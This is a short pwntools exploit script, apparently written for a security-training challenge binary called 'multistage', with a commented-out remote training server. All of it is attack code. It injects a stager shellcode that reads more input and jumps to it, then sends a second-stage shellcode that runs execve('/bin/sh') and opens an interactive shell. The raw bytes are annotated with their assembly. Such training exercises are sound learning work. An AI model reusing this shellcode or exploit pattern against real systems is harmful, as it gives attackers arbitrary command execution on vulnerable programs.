#!/usr/bin/python
from pwn import *
import time

#	b *0x00401240
context.terminal = ['tmux', 'splitw', '-h']
r = process("./multistage")
gdb.attach(r, """
	b *0x00401240
	c
	""")

#r = remote("training.jinblack.it", 2003)
input("wait")

read = b"\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\x89\xF2\x0F\x05\xCD\x80\xFF\xE6"
#mov rsi, rax
#xor rax, rax
#xor rdi, rdi
#mov rdx, rsi
#syscall
#int 0x80
#jmp rsi

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF" + b"/bin/sh\x00" + b"\x00"*8

r.send(read)

r.send(shellcode)
print(r.recvuntil("name?\n"))
time.sleep(0.1)

r.interactive()